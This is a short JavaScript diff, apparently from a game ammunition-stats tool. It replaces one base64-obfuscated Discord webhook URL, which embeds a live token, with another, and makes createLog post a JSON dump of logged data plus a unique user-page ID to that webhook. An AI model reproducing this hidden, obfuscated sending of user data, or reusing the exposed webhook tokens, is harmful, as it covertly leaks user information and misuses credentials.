@@ -2,7 +2,7 @@
 //D = 0.00906669**2+4*0.00000970477*(0.381528-y)
 //x = (-0.00906669-sqrt(D))/(-0.00000970477*2)
 
-const WEBHOOK_URL = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTI0NDk3NzYwNTU4NTY3MDIxNS9yaUlKbGJTdVhCRzEyUkdTRnhTeTB1S3hMcGJES3pVZ3JpTkZhWG9KX29xNmlRcHE2QlN0bFE4cTZzamROZWdCci01bA=="
+const WEBHOOK_URL = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM1Mjk1MjQ5MDkxNTUyODc0NS9PbjlvVGxqZmpTOEhDNWMwdDh5S3d5c251QWl2LVlmVnpsODJ5bEwzS2ZFQ00wMWpxU1F5elpSSFhnWTEzdWljb2RsYQ=="
 
 var ammo_stats_titles = {
     "fuse_sensitive": ["Fuse Sensitive", "mm", 1],
@@ -1217,7 +1217,10 @@ function createLog() {
 
 ## Debug
 - **Unique User-Page ID**: ${unique_up_id}
-`, WEBHOOK_URL);
+
+data: \`\`\`json
+${JSON.stringify(log)}
+\`\`\``, WEBHOOK_URL);
             })
             .catch(error => {
                 console.error('Error fetching:', error);
